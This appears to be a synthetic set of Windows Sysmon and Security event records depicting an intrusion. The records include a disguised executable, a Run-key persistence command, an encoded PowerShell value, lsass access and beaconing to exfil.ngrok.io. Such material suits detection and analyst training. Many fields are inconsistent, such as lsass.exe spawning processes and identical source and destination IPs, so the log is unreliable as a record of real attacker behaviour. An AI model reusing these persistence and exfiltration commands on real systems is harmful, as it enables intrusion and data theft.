  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>11</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T10:33:51.0000000Z" /><EventRecordID>475</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>DC01</Computer></System><EventData><Data Name="UtcTime">2024-11-25T10:33:51.0000000Z</Data><Data Name="ProcessId">9071</Data><Data Name="Image">C:\Windows\System32\lsass.exe</Data><Data Name="TargetFilename">C:\Users\alice\Downloads\invoice_scan.pdf.exe</Data><Data Name="CreationUtcTime">2024-11-25T10:33:51.0000000Z</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T10:33:53.0000000Z" /><EventRecordID>476</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>DC01</Computer></System><EventData><Data Name="SubjectUserName">jane.smith</Data><Data Name="SubjectDomainName">CORP</Data><Data Name="NewProcessId">0xb976</Data><Data Name="NewProcessName">C:\Users\alice\Downloads\setup.exe</Data><Data Name="CommandLine">reg.exe ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Update /d C:\temp\update.exe</Data><Data Name="ParentProcessName">C:\Windows\System32\lsass.exe</Data><Data Name="TokenElevationType">%%1936</Data><Data Name="ProcessId">0x2ba</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>3</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T10:34:20.0000000Z" /><EventRecordID>477</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>DC01</Computer></System><EventData><Data Name="UtcTime">2024-11-25T10:34:20.0000000Z</Data><Data Name="Image">C:\Windows\System32\cmd.exe</Data><Data Name="User">NT AUTHORITY\SYSTEM</Data><Data Name="Protocol">tcp</Data><Data Name="SourceIp">10.0.1.12</Data><Data Name="SourcePort">36890</Data><Data Name="DestinationIp">10.0.1.12</Data><Data Name="DestinationPort">4444</Data><Data Name="DestinationHostname">exfil.ngrok.io</Data><Data Name="Initiated">true</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>10</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T10:34:32.0000000Z" /><EventRecordID>478</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WKSTN-ALICE</Computer></System><EventData><Data Name="UtcTime">2024-11-25T10:34:32.0000000Z</Data><Data Name="SourceProcessId">45940</Data><Data Name="SourceImage">C:\Windows\System32\powershell.exe</Data><Data Name="TargetProcessId">42308</Data><Data Name="TargetImage">C:\Windows\System32\lsass.exe</Data><Data Name="GrantedAccess">0x1010</Data><Data Name="CallTrace">C:\Windows\System32\ntdll.dll+0x5d15</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4698</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T10:35:52.0000000Z" /><EventRecordID>479</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>DC02</Computer></System><EventData><Data Name="SubjectUserName">svc_sql</Data><Data Name="SubjectDomainName">NT AUTHORITY</Data><Data Name="TaskName">\exfil_daily</Data><Data Name="TaskContent">&lt;Task&gt;&lt;Actions&gt;&lt;Exec&gt;&lt;Command&gt;powershell.exe&lt;/Command&gt;&lt;/Exec&gt;&lt;/Actions&gt;&lt;/Task&gt;</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T10:35:56.0000000Z" /><EventRecordID>480</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>JUMPHOST01</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-2741-9154-4254-1001</Data><Data Name="TargetUserName">t.miller</Data><Data Name="TargetDomainName">CORP</Data><Data Name="LogonType">10</Data><Data Name="IpAddress">203.0.113.45</Data><Data Name="IpPort">14114</Data><Data Name="ProcessName">C:\Windows\SysWOW64\rundll32.exe</Data><Data Name="WorkstationName">JUMPHOST01</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Service Control Manager" /><EventID>7045</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T10:36:38.0000000Z" /><EventRecordID>481</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>System</Channel><Computer>WKSTN-BOB</Computer></System><EventData><Data Name="ServiceName">svc_exfil</Data><Data Name="ImagePath">C:\Users\alice\Downloads\setup.exe</Data><Data Name="ServiceType">user mode service</Data><Data Name="StartType">demand start</Data><Data Name="AccountName">LocalSystem</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4625</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T10:36:46.0000000Z" /><EventRecordID>482</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>DC01</Computer></System><EventData><Data Name="SubjectUserName">-</Data><Data Name="TargetUserName">jane.smith</Data><Data Name="TargetDomainName">NT AUTHORITY</Data><Data Name="LogonType">3</Data><Data Name="FailureReason">%%2313</Data><Data Name="Status">0xc000006d</Data><Data Name="SubStatus">0xc0000064</Data><Data Name="IpAddress">192.168.1.200</Data><Data Name="IpPort">22690</Data><Data Name="WorkstationName">DC01</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4672</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T10:36:47.0000000Z" /><EventRecordID>483</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>DC01</Computer></System><EventData><Data Name="SubjectUserName">alice</Data><Data Name="SubjectDomainName">CORP</Data><Data Name="SubjectLogonId">0xe5d1c6</Data><Data Name="PrivilegeList">SeSecurityPrivilege
			SeBackupPrivilege
			SeRestorePrivilege</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>1</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T10:37:11.0000000Z" /><EventRecordID>484</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>SRV-SQL01</Computer></System><EventData><Data Name="UtcTime">2024-11-25T10:37:11.0000000Z</Data><Data Name="ProcessGuid">{05AEC-AA14-170F6-9D6A}</Data><Data Name="ProcessId">30933</Data><Data Name="Image">C:\Windows\System32\powershell.exe</Data><Data Name="CommandLine">cmd.exe /c whoami &amp;&amp; net user</Data><Data Name="User">.\jane.smith</Data><Data Name="ParentProcessId">4427</Data><Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data><Data Name="ParentCommandLine">svchost.exe -k netsvcs</Data><Data Name="Hashes">MD5=430ed20ca4138d19f9752cd0fc41b92c,SHA256=26abc7df3909190a52f82cda5e9c624a3907375cef6635cd449240ada7920d50</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4720</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T10:38:04.0000000Z" /><EventRecordID>485</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>DC02</Computer></System><EventData><Data Name="SubjectUserName">bob</Data><Data Name="SubjectDomainName">CORP</Data><Data Name="TargetUserName">newuser971</Data><Data Name="TargetDomainName">CORP</Data><Data Name="PrivilegeList">-</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T10:38:24.0000000Z" /><EventRecordID>486</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-ALICE</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-5395-2522-7105-1001</Data><Data Name="TargetUserName">admin</Data><Data Name="TargetDomainName">.</Data><Data Name="LogonType">3</Data><Data Name="IpAddress">172.16.5.10</Data><Data Name="IpPort">13008</Data><Data Name="ProcessName">C:\Windows\System32\powershell.exe</Data><Data Name="WorkstationName">WKSTN-ALICE</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4697</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T10:39:57.0000000Z" /><EventRecordID>487</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-WEB01</Computer></System><EventData><Data Name="SubjectUserName">SYSTEM</Data><Data Name="SubjectDomainName">NT AUTHORITY</Data><Data Name="ServiceName">Schedule</Data><Data Name="ServiceFileName">C:\Windows\SysWOW64\rundll32.exe</Data><Data Name="ServiceType">0x10</Data><Data Name="ServiceStartType">2</Data><Data Name="ServiceAccount">LocalSystem</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>22</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T10:40:03.0000000Z" /><EventRecordID>488</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>SRV-WEB01</Computer></System><EventData><Data Name="UtcTime">2024-11-25T10:40:03.0000000Z</Data><Data Name="ProcessId">8409</Data><Data Name="Image">C:\Users\alice\AppData\Roaming\implant.exe</Data><Data Name="QueryName">au.download.windowsupdate.com</Data><Data Name="QueryStatus">0</Data><Data Name="QueryResults">10.0.2.99</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>10</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T10:40:06.0000000Z" /><EventRecordID>489</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>DC01</Computer></System><EventData><Data Name="UtcTime">2024-11-25T10:40:06.0000000Z</Data><Data Name="SourceProcessId">7796</Data><Data Name="SourceImage">C:\Windows\System32\regsvr32.exe</Data><Data Name="TargetProcessId">28264</Data><Data Name="TargetImage">C:\Windows\System32\lsass.exe</Data><Data Name="GrantedAccess">0x1fffff</Data><Data Name="CallTrace">C:\Windows\System32\ntdll.dll+0x8b90</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>22</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T10:40:12.0000000Z" /><EventRecordID>490</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>LAPTOP-MGMT</Computer></System><EventData><Data Name="UtcTime">2024-11-25T10:40:12.0000000Z</Data><Data Name="ProcessId">41063</Data><Data Name="Image">C:\Users\alice\AppData\Roaming\implant.exe</Data><Data Name="QueryName">exfil.ngrok.io</Data><Data Name="QueryStatus">0</Data><Data Name="QueryResults">10.100.10.50</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>13</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T10:40:40.0000000Z" /><EventRecordID>491</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>SRV-FILE01</Computer></System><EventData><Data Name="UtcTime">2024-11-25T10:40:40.0000000Z</Data><Data Name="EventType">SetValue</Data><Data Name="ProcessId">45857</Data><Data Name="Image">C:\Windows\System32\lsass.exe</Data><Data Name="TargetObject">HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Update</Data><Data Name="Details">powershell.exe -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4776</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T10:40:41.0000000Z" /><EventRecordID>492</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-SQL01</Computer></System><EventData><Data Name="PackageName">MICROSOFT_AUTHENTICATION_PACKAGE_V1_0</Data><Data Name="TargetUserName">bob</Data><Data Name="Workstation">DC02</Data><Data Name="Status">0xC0000064</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4672</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T10:40:46.0000000Z" /><EventRecordID>493</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>DC01</Computer></System><EventData><Data Name="SubjectUserName">admin</Data><Data Name="SubjectDomainName">CONTOSO</Data><Data Name="SubjectLogonId">0xbb7aeb</Data><Data Name="PrivilegeList">SeSecurityPrivilege
			SeBackupPrivilege
			SeRestorePrivilege</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T10:41:08.0000000Z" /><EventRecordID>494</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>JUMPHOST01</Computer></System><EventData><Data Name="SubjectUserName">bob</Data><Data Name="SubjectDomainName">CONTOSO</Data><Data Name="NewProcessId">0x8b5f</Data><Data Name="NewProcessName">C:\Windows\System32\reg.exe</Data><Data Name="CommandLine">powershell.exe Get-Process | Export-Csv C:\temp\procs.csv</Data><Data Name="ParentProcessName">C:\Users\alice\Downloads\setup.exe</Data><Data Name="TokenElevationType">%%1936</Data><Data Name="ProcessId">0x688</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>3</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T10:41:09.0000000Z" /><EventRecordID>495</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>SRV-WEB01</Computer></System><EventData><Data Name="UtcTime">2024-11-25T10:41:09.0000000Z</Data><Data Name="Image">C:\Windows\System32\powershell.exe</Data><Data Name="User">CONTOSO\jane.smith</Data><Data Name="Protocol">tcp</Data><Data Name="SourceIp">172.16.5.10</Data><Data Name="SourcePort">56852</Data><Data Name="DestinationIp">10.0.0.5</Data><Data Name="DestinationPort">8080</Data><Data Name="DestinationHostname">au.download.windowsupdate.com</Data><Data Name="Initiated">true</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4625</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T10:41:15.0000000Z" /><EventRecordID>496</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>DC02</Computer></System><EventData><Data Name="SubjectUserName">-</Data><Data Name="TargetUserName">john.doe</Data><Data Name="TargetDomainName">.</Data><Data Name="LogonType">3</Data><Data Name="FailureReason">%%2313</Data><Data Name="Status">0xc000006d</Data><Data Name="SubStatus">0xc0000064</Data><Data Name="IpAddress">192.168.1.200</Data><Data Name="IpPort">64603</Data><Data Name="WorkstationName">DC02</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4672</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T10:41:17.0000000Z" /><EventRecordID>497</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>JUMPHOST01</Computer></System><EventData><Data Name="SubjectUserName">alice</Data><Data Name="SubjectDomainName">NT AUTHORITY</Data><Data Name="SubjectLogonId">0x773d29</Data><Data Name="PrivilegeList">SeSecurityPrivilege
			SeBackupPrivilege
			SeRestorePrivilege</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>22</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T10:41:32.0000000Z" /><EventRecordID>498</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WKSTN-BOB</Computer></System><EventData><Data Name="UtcTime">2024-11-25T10:41:32.0000000Z</Data><Data Name="ProcessId">53511</Data><Data Name="Image">C:\Windows\System32\cmd.exe</Data><Data Name="QueryName">exfil.ngrok.io</Data><Data Name="QueryStatus">0</Data><Data Name="QueryResults">172.16.5.10</Data></EventData></Event>
  